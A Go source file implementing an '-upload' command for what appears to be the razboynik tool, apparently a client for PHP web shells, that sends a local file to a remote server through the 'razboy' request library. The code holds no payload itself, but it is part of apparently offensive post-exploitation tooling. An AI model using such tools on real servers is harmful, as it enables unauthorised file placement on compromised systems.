package phpmodule

import (
	"errors"
	"strings"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
	"github.com/eatbytes/razboynik/services/lister"
)

type Uploadcmd struct{}

func (u *Uploadcmd) Exec(kl *kernel.KernelLine, config *razboy.Config) kernel.KernelResponse {
	var (
		local, remote string
		err           error
		request       *razboy.REQUEST
		response      *razboy.RESPONSE
	)

	args := kl.GetArr()

	if len(args) < 1 {
		return kernel.KernelResponse{Err: errors.New("Please write the path of the local file to upload")}
	}

	request = razboy.CreateRequest(kl.GetRaw(), config)
	local = args[0]

	if len(args) > 1 {
		remote = args[1]
	} else {
		pathArr := strings.Split(local, "/")
		lgt := len(pathArr) - 1
		remote = pathArr[lgt]
	}

	response, err = UploadAction(local, remote, request)

	if err != nil {
		return kernel.KernelResponse{Err: err}
	}

	if response.GetResult() != "1" {
		return kernel.KernelResponse{Err: errors.New("Server havn't upload the file")}
	}

	kernel.WriteSuccess(kl.GetStdout(), response.GetResult())

	return kernel.KernelResponse{Body: response.GetResult()}
}

func (u *Uploadcmd) GetName() string {
	return "-upload"
}

func (u *Uploadcmd) GetCompleter() (kernel.CompleterFunction, bool) {
	return lister.Local, true
}

func UploadAction(local, remote string, request *razboy.REQUEST) (*razboy.RESPONSE, error) {
	request.Action = razboy.CreateUpload(remote)
	request.Upload = true
	request.UploadPath = local

	return razboy.Send(request)
}
